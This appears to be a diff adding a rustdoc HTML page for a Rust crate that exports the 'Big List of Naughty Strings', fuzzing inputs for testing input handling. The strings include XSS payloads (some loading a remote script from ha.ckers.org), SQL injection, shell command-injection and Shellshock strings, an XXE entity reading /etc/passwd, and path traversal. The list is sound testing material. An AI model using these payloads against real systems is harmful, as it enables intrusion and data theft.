+    <span class='string'>&quot;&lt;a href=\&quot;\\x0Djavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x0Ajavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x0Cjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x15javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\xA8javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x16javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x02javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x1Bjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x06javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\xA9javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x85javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x1Ejavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x1Cjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;javascript\\x00:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;javascript\\x3A:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;javascript\\x09:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;javascript\\x0D:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;javascript\\x0A:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x0Aonerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x22onerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x0Bonerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x0Donerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x2Fonerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x09onerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x0Conerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x00onerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x27onerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;`\&quot;\&#39;&gt;&lt;img src=xxx:x \\x20onerror=javascript:alert(1)&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x3Bjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x0Djavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xEF\\xBB\\xBFjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x81javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x84javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE3\\x80\\x80javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x09javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x89javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x85javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x88javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x00javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\xA8javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x8Ajavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE1\\x9A\\x80javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x0Cjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x2Bjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xF0\\x90\\x96\\x9Ajavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x0Ajavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\xAFjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x7Ejavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x87javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x81\\x9Fjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\xA9javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xC2\\x85javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xEF\\xBF\\xAEjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x83javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x8Bjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xEF\\xBF\\xBEjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x80javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x21javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x82javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE2\\x80\\x86javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xE1\\xA0\\x8Ejavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x0Bjavascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\x20javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;`\&#39;&gt;&lt;script&gt;\\xC2\\xA0javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x00src=x onerror=\&quot;alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x47src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x11src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x12src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img\\x47src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img\\x10src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img\\x13src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img\\x32src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img\\x47src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img\\x11src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x47src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x34src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x39src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img \\x00src=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x09=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x10=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x13=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x32=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x12=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x11=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x00=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src\\x47=x onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x\\x09onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x\\x10onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x\\x11onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x\\x12onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x\\x13onerror=\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img[a][b][c]src[d]=x[e]onerror=[f]\&quot;alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x onerror=\\x09\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x onerror=\\x10\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x onerror=\\x11\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x onerror=\\x12\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x onerror=\\x32\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x onerror=\\x00\&quot;javascript:alert(1)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=\&quot;x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;\&quot;` `&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src onerror /\&quot; \&#39;\&quot;= alt=javascript:alert(1)//\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt=\&quot;`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script src=\&quot;/\\%(jscript)s\&quot;&gt;&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script src=\&quot;\\\\%(jscript)s\&quot;&gt;&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG \&quot;\&quot;\&quot;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCRIPT&gt;\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=# onmouseover=\&quot;alert(\&#39;xxs\&#39;)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC= onmouseover=\&quot;alert(\&#39;xxs\&#39;)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG onmouseover=\&quot;alert(\&#39;xxs\&#39;)\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=\&quot;jav   ascript:alert(\&#39;XSS\&#39;);\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=\&quot;jav&amp;#x09;ascript:alert(\&#39;XSS\&#39;);\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=\&quot;jav&amp;#x0A;ascript:alert(\&#39;XSS\&#39;);\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=\&quot;jav&amp;#x0D;ascript:alert(\&#39;XSS\&#39;);\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;perl -e \&#39;print \&quot;&lt;IMG SRC=java\\0script:alert(\\\&quot;XSS\\\&quot;)&gt;\&quot;;\&#39; &gt; out&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=\&quot; &amp;#14;  javascript:alert(\&#39;XSS\&#39;);\&quot;&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;SCRIPT/XSS SRC=\&quot;http://ha.ckers.org/xss.js\&quot;&gt;&lt;/SCRIPT&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(\&quot;XSS\&quot;)&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;SCRIPT/SRC=\&quot;http://ha.ckers.org/xss.js\&quot;&gt;&lt;/SCRIPT&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;);//&lt;&lt;/SCRIPT&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;&quot;</span>,
+    <span class='string'>&quot;&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;IMG SRC=\&quot;javascript:alert(\&#39;XSS\&#39;)\&quot;&quot;</span>,
+    <span class='string'>&quot;&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;&quot;</span>,
+    <span class='string'>&quot;\\\&quot;;alert(\&#39;XSS\&#39;);//&quot;</span>,
+    <span class='string'>&quot;&lt;u oncopy=alert()&gt; Copy me&lt;/u&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;i onwheel=alert(1)&gt; Scroll over me &lt;/i&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;plaintext&gt;&quot;</span>,
+    <span class='string'>&quot;http://a/%%30%30&quot;</span>,
+    <span class='string'>&quot;1;DROP TABLE users&quot;</span>,
+    <span class='string'>&quot;1\&#39;; DROP TABLE users-- 1&quot;</span>,
+    <span class='string'>&quot;\&#39; OR 1=1 -- 1&quot;</span>,
+    <span class='string'>&quot;\&#39; OR \&#39;1\&#39;=\&#39;1&quot;</span>,
+    <span class='string'>&quot; &quot;</span>,
+    <span class='string'>&quot;%&quot;</span>,
+    <span class='string'>&quot;_&quot;</span>,
+    <span class='string'>&quot;-&quot;</span>,
+    <span class='string'>&quot;--&quot;</span>,
+    <span class='string'>&quot;--version&quot;</span>,
+    <span class='string'>&quot;--help&quot;</span>,
+    <span class='string'>&quot;$USER&quot;</span>,
+    <span class='string'>&quot;/dev/null; touch /tmp/blns.fail ; echo&quot;</span>,
+    <span class='string'>&quot;`touch /tmp/blns.fail`&quot;</span>,
+    <span class='string'>&quot;$(touch /tmp/blns.fail)&quot;</span>,
+    <span class='string'>&quot;@{[system \&quot;touch /tmp/blns.fail\&quot;]}&quot;</span>,
+    <span class='string'>&quot;eval(\&quot;puts \&#39;hello world\&#39;\&quot;)&quot;</span>,
+    <span class='string'>&quot;System(\&quot;ls -al /\&quot;)&quot;</span>,
+    <span class='string'>&quot;`ls -al /`&quot;</span>,
+    <span class='string'>&quot;Kernel.exec(\&quot;ls -al /\&quot;)&quot;</span>,
+    <span class='string'>&quot;Kernel.exit(1)&quot;</span>,
+    <span class='string'>&quot;%x(\&#39;ls -al /\&#39;)&quot;</span>,
+    <span class='string'>&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;ISO-8859-1\&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM \&quot;file:///etc/passwd\&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;</span>,
+    <span class='string'>&quot;$HOME&quot;</span>,
+    <span class='string'>&quot;$ENV{\&#39;HOME\&#39;}&quot;</span>,
+    <span class='string'>&quot;%d&quot;</span>,
+    <span class='string'>&quot;%s&quot;</span>,
+    <span class='string'>&quot;{0}&quot;</span>,
+    <span class='string'>&quot;%*.*s&quot;</span>,
+    <span class='string'>&quot;../../../../../../../../../../../etc/passwd%00&quot;</span>,
+    <span class='string'>&quot;../../../../../../../../../../../etc/hosts&quot;</span>,
+    <span class='string'>&quot;() { 0; }; touch /tmp/blns.shellshock1.fail;&quot;</span>,
+    <span class='string'>&quot;() { _; } &gt;_[$($())] { touch /tmp/blns.shellshock2.fail; }&quot;</span>,
+    <span class='string'>&quot;CON&quot;</span>,
+    <span class='string'>&quot;PRN&quot;</span>,
+    <span class='string'>&quot;AUX&quot;</span>,
+    <span class='string'>&quot;CLOCK$&quot;</span>,
+    <span class='string'>&quot;NUL&quot;</span>,
+    <span class='string'>&quot;A:&quot;</span>,
+    <span class='string'>&quot;ZZ:&quot;</span>,
+    <span class='string'>&quot;COM1&quot;</span>,
+    <span class='string'>&quot;LPT1&quot;</span>,
+    <span class='string'>&quot;LPT2&quot;</span>,
+    <span class='string'>&quot;LPT3&quot;</span>,
+    <span class='string'>&quot;COM2&quot;</span>,
+    <span class='string'>&quot;COM3&quot;</span>,
+    <span class='string'>&quot;COM4&quot;</span>,
+    <span class='string'>&quot;Scunthorpe General Hospital&quot;</span>,
+    <span class='string'>&quot;Penistone Community Church&quot;</span>,
+    <span class='string'>&quot;Lightwater Country Park&quot;</span>,
+    <span class='string'>&quot;Jimmy Clitheroe&quot;</span>,
+    <span class='string'>&quot;Horniman Museum&quot;</span>,
+    <span class='string'>&quot;shitake mushrooms&quot;</span>,
+    <span class='string'>&quot;RomansInSussex.co.uk&quot;</span>,
+    <span class='string'>&quot;http://www.cum.qc.ca/&quot;</span>,
+    <span class='string'>&quot;Craig Cockburn, Software Specialist&quot;</span>,
+    <span class='string'>&quot;Linda Callahan&quot;</span>,
+    <span class='string'>&quot;Dr. Herman I. Libshitz&quot;</span>,
+    <span class='string'>&quot;magna cum laude&quot;</span>,
+    <span class='string'>&quot;Super Bowl XXX&quot;</span>,
+    <span class='string'>&quot;medieval erection of parapets&quot;</span>,
+    <span class='string'>&quot;evaluate&quot;</span>,
+    <span class='string'>&quot;mocha&quot;</span>,
+    <span class='string'>&quot;expression&quot;</span>,
+    <span class='string'>&quot;Arsenal canal&quot;</span>,
+    <span class='string'>&quot;classic&quot;</span>,
+    <span class='string'>&quot;Tyson Gay&quot;</span>,
+    <span class='string'>&quot;basement&quot;</span>,
+    <span class='string'>&quot;If you\&#39;re reading this, you\&#39;ve been in a coma for almost 20 years now. We\&#39;re trying a new technique. We don\&#39;t know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.&quot;</span>,
+    <span class='string'>&quot;Roses are \u{1b}[0;31mred\u{1b}[0m, violets are \u{1b}[0;34mblue. Hope you enjoy terminal hue&quot;</span>,
+    <span class='string'>&quot;But now...\u{1b}[20Cfor my greatest trick...\u{1b}[8m&quot;</span>,
+    <span class='string'>&quot;The quic\u{8}\u{8}\u{8}\u{8}\u{8}\u{8}k brown fo\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}\u{7}x... [Beeeep]&quot;</span>,
+    <span class='string'>&quot;Power\u{644}\u{64f}\u{644}\u{64f}\u{635}\u{651}\u{628}\u{64f}\u{644}\u{64f}\u{644}\u{635}\u{651}\u{628}\u{64f}\u{631}\u{631}\u{64b} \u{963} \u{963}h \u{963} \u{963}\u{5197}&quot;</span>,
+];
+
+<span class='doccomment'>/// Big list of naughty strings.</span>
+<span class='kw'>pub</span> <span class='kw'>const</span> <span class='ident'>BLNS</span>: <span class='kw-2'>&amp;</span><span class='lifetime'>&#39;static</span> [<span class='kw-2'>&amp;</span><span class='lifetime'>&#39;static</span> <span class='ident'>str</span>] <span class='op'>=</span> <span class='ident'>BLNS_IMPL</span>;</pre>
+</section>
+    <section id='search' class="content hidden"></section>
+
+    <section class="footer"></section>
+
+    <aside id="help" class="hidden">
+        <div>
+            <h1 class="hidden">Help</h1>
+
+            <div class="shortcuts">
+                <h2>Keyboard Shortcuts</h2>
+
+                <dl>
+                    <dt>?</dt>
+                    <dd>Show this help dialog</dd>
+                    <dt>S</dt>
+                    <dd>Focus the search field</dd>
+                    <dt>&larrb;</dt>
+                    <dd>Move up in search results</dd>
+                    <dt>&rarrb;</dt>
+                    <dd>Move down in search results</dd>
+                    <dt>&#9166;</dt>
+                    <dd>Go to active search result</dd>
+                </dl>
+            </div>
+
+            <div class="infos">
+                <h2>Search Tricks</h2>
+
+                <p>
+                    Prefix searches with a type followed by a colon (e.g.
+                    <code>fn:</code>) to restrict the search to a given type.
+                </p>
+
+                <p>
+                    Accepted types are: <code>fn</code>, <code>mod</code>,
+                    <code>struct</code>, <code>enum</code>,
+                    <code>trait</code>, <code>type</code>, <code>macro</code>,
+                    and <code>const</code>.
+                </p>
+
+                <p>
+                    Search functions by type signature (e.g.
+                    <code>vec -> usize</code>)
+                </p>
+            </div>
+        </div>
+    </aside>
+
+    
+
+    <script>
+        window.rootPath = "../../";
+        window.currentCrate = "naughty_strings";
+        window.playgroundUrl = "";
+    </script>
+    <script src="../../jquery.js"></script>
+    <script src="../../main.js"></script>
+    
+    <script defer src="../../search-index.js"></script>
+</body>
+</html>
